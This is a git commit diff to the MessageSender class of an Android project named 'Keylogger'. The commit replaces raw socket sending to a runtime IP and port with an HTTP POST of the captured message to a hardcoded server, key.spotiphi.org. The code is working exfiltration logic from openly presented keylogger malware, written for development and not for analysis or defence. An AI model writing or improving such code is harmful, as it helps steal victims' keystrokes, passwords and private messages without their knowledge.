083fd96b11b1671c8a3bf1fcbb67e736559c2668
Shayan105 <119674649+Shayan105@users.noreply.github.com>
2024-12-30 14:59:33 +0100

    to http

--- Keylogger/app/src/main/java/com/keylogger/MessageSender.java
+++ Keylogger/app/src/main/java/com/keylogger/MessageSender.java
@@ -1,35 +1,59 @@
 package com.keylogger;
-import android.os.*;
-import java.net.Socket;
-import java.io.*;
 
-public class MessageSender extends AsyncTask<String,Void,Void>
-{
-	Socket s;
-	DataOutputStream dos;
-	PrintWriter pw;
+import android.os.AsyncTask;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class MessageSender extends AsyncTask<String, Void, Void> {
 
 	@Override
-	protected Void doInBackground(String... voids)
-	{	
-		String message = voids[0];
-		String ip=voids[1];
-		int port= Integer.parseInt(voids[2]);
-		try
-		{
-			s = new Socket(ip, port);
-			pw =  new PrintWriter(s.getOutputStream());
-			pw.write(message.concat("\n"));
-			pw.flush();
-			s.close();
-		}
-		catch (IOException e)
-		{
+	protected Void doInBackground(String... params) {
+		String message = params[0];
+		String urlString = "http://key.spotiphi.org"; // Server URL
+
+		HttpURLConnection urlConnection = null;
+
+		try {
+			// Create URL object
+			URL url = new URL(urlString);
+
+			// Open the connection
+			urlConnection = (HttpURLConnection) url.openConnection();
+
+			// Set request method to POST
+			urlConnection.setRequestMethod("POST");
+
+			// Enable output to send the POST data
+			urlConnection.setDoOutput(true);
+
+			// Set headers (optional)
+			urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+
+			// Prepare the POST data
+			String postData = "message=" + message;
+
+			// Write data to the connection
+			try (OutputStream outputStream = urlConnection.getOutputStream()) {
+				outputStream.write(postData.getBytes());
+				outputStream.flush();
+			}
+
+			// Check the response code
+			int responseCode = urlConnection.getResponseCode();
+			if (responseCode == HttpURLConnection.HTTP_OK) {
+				// Success
+			} else {
+				// Handle server errors or other responses
+			}
+
+		} catch (Exception e) {
 			e.printStackTrace();
+		} finally {
+			if (urlConnection != null) {
+				urlConnection.disconnect();
+			}
 		}
 		return null;
 	}
-	
-	
 }
-
